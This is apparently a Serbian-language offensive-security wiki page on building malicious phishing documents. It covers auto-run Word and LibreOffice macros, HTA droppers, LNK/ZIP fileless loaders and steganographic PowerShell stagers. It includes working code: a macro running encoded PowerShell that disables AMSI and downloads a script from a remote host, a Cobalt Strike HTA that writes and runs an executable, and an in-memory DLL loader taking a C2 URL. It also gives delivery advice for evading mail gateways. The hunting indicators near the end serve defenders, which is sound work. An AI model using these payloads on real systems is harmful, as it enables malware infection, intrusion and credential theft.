# Phishing datoteke i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word vrši validaciju podataka datoteke pre otvaranja datoteke. Validacija podataka se vrši u obliku identifikacije strukture podataka prema OfficeOpenXML standardu. Ako dođe do greške tokom identifikacije strukture podataka, analizirana datoteka neće biti otvorena.

Obično Word datoteke koje sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke, a da se i dalje zadrže mogućnosti izvršavanja makroa.\
Na primer, RTF datoteka po dizajnu ne podržava makroe, ali DOCM datotekom preimenovanom u RTF rukovaće Microsoft Word i ona će moći da izvršava makroe.\
Isti interni elementi i mehanizmi primenjuju se na sav softver iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršene u nekim Office programima:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX datoteke koje referenciraju udaljeni template (File – Options – Add-ins – Manage: Templates – Go), a koji uključuje makroe, takođe mogu da „izvrše“ makroe.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Kategorije**: Links and References, **Nazivi polja**: includePicture, i **Naziv datoteke ili URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor putem makroa

Makroi se mogu koristiti za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije automatskog učitavanja

Što su češće, to je veća verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Primeri koda makroa
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document**, čime će se otvoriti Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored opcije **Document Properties and Personal Information**.

#### Doc ekstenzija

Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u **Word 97-2003 `.doc`**.\
Ovo uradite zato što **ne možete sačuvati makroe unutar `.docx`** i zato što postoji **stigmatizacija** oko ekstenzije sa omogućenim makroima **`.docm`** (npr. ikona sličice ima veliki `!`, a neki web/email gateway-i ih u potpunosti blokiraju). Zato je ova **legacy `.doc` ekstenzija najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run makroi (Basic)

LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan reverse shell makro izgleda ovako:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Obratite pažnju na udvojene navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape literalnih navodnika, tako da payload-i koji se završavaju sa `...==""")` zadržavaju uravnotežene i unutrašnju komandu i Shell argument.

Saveti za isporuku:

- Sačuvajte fajl kao `.odt` i povežite macro sa događajem dokumenta tako da se odmah pokrene prilikom otvaranja.
- Prilikom slanja email-a pomoću `swaks`, koristite `--attach @resume.odt` (`@` je obavezan kako bi bajtovi fajla, a ne string sa nazivom fajla, bili poslati kao attachment). Ovo je kritično prilikom abuse-ovanja SMTP servera koji prihvataju proizvoljne `RCPT TO` primaoce bez validacije.

## HTA fajlovi

HTA je Windows program koji **kombinuje HTML i scripting jezike (kao što su VBScript i JScript)**. On generiše korisnički interfejs i izvršava se kao "fully trusted" aplikacija, bez ograničenja browser-ovog security modela.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorer-om**, zbog čega **`mshta` zavisi od IE-a**. Ako je IE deinstaliran, HTA fajlovi neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forsiranje NTLM autentifikacije

Postoji nekoliko načina da se **„daljinski“ forsira NTLM autentifikacija**, na primer, možete dodati **nevidljive slike** u e-poruke ili HTML kojem će korisnik pristupiti (čak i HTTP MitM?). Ili žrtvi poslati **putanju do fajlova** koji će **pokrenuti** **autentifikaciju** samo **otvaranjem foldera.**

**Pogledajte ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti hash ili autentifikaciju, već možete i **izvršavati NTLM relay napade**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna mamca u vidu dokumenata (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što se stvarni PowerShell loader čuva unutar sirovih bajtova ZIP-a, nakon jedinstvenog markera, a .lnk ga izdvaja i izvršava u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira PowerShell one-liner u .lnk fajlu:

1) Pronaći originalni ZIP na uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i nadređeni direktorijum trenutnog radnog direktorijuma.
2) Pročitati bajtove ZIP-a i pronaći hardkodovani marker (npr. xFIQCV). Sve nakon markera predstavlja ugrađeni PowerShell payload.
3) Kopirati ZIP u %ProgramData%, tamo ga raspakovati i otvoriti mamac .docx dokument kako bi fajl izgledao legitimno.
4) Zaobići AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskirati sledeću fazu (npr. uklanjanjem svih znakova #) i izvršiti je u memoriji.

Primer PowerShell kostura za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Beleške
- Delivery često zloupotrebljava renomirane PaaS poddomene (npr. *.herokuapp.com) i može ograničiti payload-e (servirati bezopasne ZIP datoteke na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi se smanjili tragovi na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser control-a, tako da IE/Explorer ili bilo koja aplikacija koja ga ugrađuje automatski ponovo pokreće payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na kraj arhivskih podataka.
- .lnk koji pretražuje nadređene/korisničke foldere kako bi pronašao ZIP i otvorio decoy dokument.
- AMSI tampering putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne prepiske koje se završavaju linkovima hostovanim pod trusted PaaS domenima.

## LNK staging sa decoy-first pristupom → persistence putem scheduled-task → trusted CPL side-loading

Još jedan čest obrazac jeste **.lnk koji imitira dokument** i odmah otvara bezopasan lure, dok u pozadini priprema stvarni lanac.<sup>[[3]](#references)</sup>

Uočeni tok:
1. Prečica se **predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloader-a.
2. PowerShell razdvaja očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), tako da naivna detekcija koja traži `iwr`, `gci`, `ren`, `cpi` ili `schtasks` propušta komandu.
3. Stager prvo preuzima **decoy dokument**, otvara ga žrtvi, a zatim u pozadini rekonstruiše maliciozne datoteke.
4. Payload-i mogu biti zapisani sa **junk ekstenzijama**, a zatim preimenovani uklanjanjem filler karaktera, čime se odlaže pojavljivanje očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja putem **scheduled task-a zasnovanog na minutnom intervalu**, koji pokreće trusted host binary iz putanje u koju korisnik može da upisuje.

Minimalni hunting indikatori ovog obrasca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Korisni staging raspored koji treba prepoznati je:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza stealthy

U Rapid7 case study-ju, scheduled task je ponovo pokretao **`Fondue.exe`** iz `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio staged pored njega i exportovao **`RunFODW`**, trusted Microsoft binary je side-loadovao attacker CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Decryptuje ga kroz **Windows CNG / `bcrypt.dll`**
- Alocira executable memory i kopira decryptovani shellcode
- Indirektno ga izvršava prosleđivanjem pokazivača na shellcode kao callback-a za **`EnumUILanguagesW`**

Ovaj poslednji korak vredi posebno tražiti: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimate callback-taking WinAPI** za prenos izvršavanja.

Decrypted payload u ovoj campaign bio je **Donut** shellcode, koji je zatim u potpunosti mapirao finalni PE u memoriju i patchovao **AMSI/WLDP/ETW** u trenutnom procesu pre predaje izvršavanja. Za detaljnije beleške o side-loading-u i memory-resident post-processing-u pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični hunting pivots:
- `.lnk` koji pokreće `powershell.exe` ili `conhost.exe`, nakon čega sledi vidljiv decoy dokument.
- Kratkotrajni download-i u **`C:\Users\Public\`**, nakon kojih odmah slede rename operacije sa nonsense ekstenzija.
- Scheduled tasks sa bezazlenim imenima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **user-writable directories**.
- Trusted binaries koji učitavaju **`.cpl` / `.dll`** fajlove iz istog non-system direktorijuma.
- Base64 text blob-ovi zapisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loaded modul.

## Steganography-delimited payloads u slikama (PowerShell stager)

Recent loader chains isporučuju obfuscated JavaScript/VBS koji decode-uje i pokreće Base64 PowerShell stager. Taj stager download-uje sliku (često GIF) koja sadrži Base64-encoded .NET DLL skriven kao plain text između jedinstvenih start/end markera. Script traži ove delimitere (primeri viđeni in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extract-uje tekst između njih, Base64-decode-uje ga u bytes, učitava assembly u memoriji i invoke-uje poznatu entry metodu sa C2 URL-om.<sup>[[5]](#references)</sup>

Tok
- Stage 1: Archived JS/VBS dropper → decode-uje ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → download-uje sliku, carves marker-delimited Base64, učitava .NET DLL u memoriji i poziva njen method (npr. VAI), prosleđujući C2 URL i opcije.
- Stage 3: Loader preuzima finalni payload i obično ga inject-uje putem process hollowing-a u trusted binary (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i trusted utility proxy execution-u pogledajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za carve-ovanje DLL-a iz slike i invoke-ovanje .NET metode u memoriji:

<details>
<summary>PowerShell stego payload extractor i loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markeri se razlikuju između kampanja.
- AMSI/ETW bypass i string deobfuscation se obično primenjuju pre učitavanja assembly-ja.
- Lov: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blob-ove.

Pogledajte i stego alate i carving tehnike:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta početna faza je mali, heavily-obfuscated `.js` ili `.vbs` dostavljen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass`, kako bi bootstrap-ovao sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>

Skeleton logika (apstraktno):
- Pročitati sadržaj sopstvenog fajla
- Pronaći Base64 blob između junk stringova
- Dekodirati u ASCII PowerShell
- Izvršiti pomoću `wscript.exe`/`cscript.exe`, pozivanjem `powershell.exe`

Indikatori za lov
- Arhivirani JS/VBS attachment-i koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u command line-u.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz user temp putanja.

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM cred-ova**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Reference

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
